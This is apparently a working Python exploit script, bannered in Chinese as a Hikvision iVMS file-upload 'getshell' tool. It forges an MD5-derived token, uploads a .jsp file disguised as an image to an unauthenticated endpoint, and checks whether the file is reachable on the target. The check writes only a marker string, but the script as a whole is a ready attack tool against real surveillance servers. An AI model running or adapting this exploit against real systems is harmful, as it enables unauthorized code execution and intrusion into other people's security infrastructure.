import hashlib
import urllib
import requests
import warnings
import sys

banner="""
 ______   _ _   _ _             
|  ____| (_) \ | (_)            
| |__ ___ _|  \| |_  __ _  ___  
|  __/ _ \ | . ` | |/ _` |/ _ \ 
| | |  __/ | |\  | | (_| | (_) |
|_|  \___|_|_| \_|_|\__,_|\___/ 
                version:1.10.1
                
海康威视IVMS文件上传漏洞getshell脚本
                
"""

warnings.filterwarnings("ignore")
headere = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169",
        "Content-Type" :"multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo"
    }
poc = "/eps/api/resourceOperations/uploadsecretKeyIbuilding"
poc1 = "/eps/api/resourceOperations/upload?token="


def mdencode(url):
    hashurl = url + poc
    hl = hashlib.md5()
    hl.update(hashurl.encode(encoding='utf-8'))
    return (hl.hexdigest()).upper()

def uploadtext(url):
    print("正在进行文件上传 {} 请稍后".format(url))
    headere = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169",
        "Content-Type" :"multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo"
    }

    data ='------WebKitFormBoundaryGEJwiloiPo\r\nContent-Disposition: form-data; name="fileUploader";filename="1.jsp"\r\nContent-Type: image/jpeg\r\n\r\nhkvs\r\n------WebKitFormBoundaryGEJwiloiPo'

    hs = mdencode(url)
    try:
        res = requests.post(url=url + poc1 + hs,headers=headere,data=data)
        path = res.text.replace('\"',"").replace('{',"").replace('}',"").split('resourceUuid:')[1].split(",resourceType")[0]
        ress = requests.get(url=url+"/eps/upload/"+path+".jsp",verify=False,timeout=10,headers=headere)
        if "hkvs" in ress.text and ress.status_code == 200:
            print("文件上传成功,请访问 {} 进行查看!!!".format(url+"/eps/upload/"+path+".jsp"))
    except Exception as e:
        print("文件上传失败: {}".format(url))
        print(e)
        
if __name__ == '__main__':
    print(banner)
    url = sys.argv[2]
    uploadtext(url)
    
